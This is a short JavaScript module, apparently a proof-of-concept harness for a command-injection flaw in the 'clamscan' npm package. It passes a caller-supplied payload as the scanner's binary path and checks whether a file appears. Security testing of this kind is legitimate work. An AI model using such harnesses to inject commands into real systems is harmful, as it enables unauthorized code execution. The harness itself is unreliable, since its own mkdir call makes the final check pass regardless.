const Root = require("clamscan");
const fs = require("fs");

function exploitFunction(payload) {
  const path = payload;
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var root = new Root();
  fs.mkdir(path, function () {});

  return root
    .init({ clamscan: { path: path } })
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
}

module.exports = { exploitFunction };